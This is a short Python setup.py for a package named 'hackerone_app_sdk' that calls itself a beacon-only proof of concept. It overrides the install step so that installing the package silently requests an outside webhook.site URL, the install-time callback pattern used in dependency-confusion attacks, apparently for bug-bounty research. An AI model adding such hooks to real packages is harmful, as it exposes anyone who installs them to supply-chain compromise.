from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/f899db46-9633-4ce7-a5e4-01b26fd0e940"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="hackerone_app_sdk",
    version="0.19.1",
    packages=["hackerone_app_sdk"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
